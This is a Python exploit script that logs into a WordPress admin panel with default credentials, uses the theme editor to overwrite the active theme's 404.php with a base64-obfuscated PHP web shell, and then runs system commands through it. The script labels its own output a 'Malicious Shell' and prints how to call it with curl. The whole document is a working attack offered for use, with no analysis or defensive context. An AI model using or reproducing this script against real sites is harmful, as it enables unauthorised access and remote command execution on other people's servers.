import requests
import re

#Host is the root directory of wordpress; could also be http://localhost/someotherdirectory/
host = 'http://localhost/'
wp_login = host + 'wp-login.php'
wp_admin = host + 'wp-admin/'
username = 'admin'
password = 'admin'

#<?php echo shell_exec($_GET['cmd'].' 2>&1'); ?>
phpshell = '<?php eval(\"?>\".base64_decode("PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWydjbWQnXS4nIDI+JjEnKTsgPz4=")); ?>'

#Login and create a session for requests following initial authentication
with requests.Session() as s:
    headers1 = { 'Cookie':'wordpress_test_cookie=WP Cookie check' }
    datas={  
        'log': username, 
        'pwd': password, 
        'wp-submit': 'Log In', 
        'redirect_to': wp_admin, 
        'testcookie': '1'  
    }
    s.post(wp_login, headers=headers1, data=datas)
    resp = s.get(wp_admin)
    
    #Find Theme in use
    test = s.get(wp_admin + 'theme-editor.php')
    regtest = test.text
    z = re.findall("Text Domain.*", regtest)[0]
    zz = re.split("\s", z)[2]
    theme = zz
    
    #Find _wpnonce variable data
    getEditpage = s.get(wp_admin + "theme-editor.php?file=404.php&theme=" + theme)
    regtest2 = getEditpage.text
    zzz = re.findall("id=\"_wpnonce\".*", regtest2)[0]
    zzzz = re.split("\s", zzz)[2]
    zzzzz = re.findall(r'["](.*?)["]', zzzz)[0]
    nonce = zzzzz
    
    #Uploading Shell
    datas2 = { 
        '_wp_http_referer':wp_admin + "theme-editor.php?file=404.php&theme=" + theme + "&scrollto=0&updated=true", 
        'newcontent': phpshell, 
        'action': 'update',
        '_wpnonce': nonce,
        'file': '404.php',
        'theme': theme,
        'scrollto': '0',
        'docs-list': "",
        'submit': 'Update File'
    }
    edit = s.post(wp_admin + "theme-editor.php?file=404.php&theme=" + theme, datas2)
    execute = s.get(host + 'wp-content/themes/' + theme + '/404.php?cmd=uname -a;id;pwd;')
    print(execute.text)
    print('++ Malicious Shell uploaded to 404.php')
    print('----> ' 'Can be accessed using curl ' + host + 'wp-content/themes/' + theme + '/404.php?cmd=<command>')
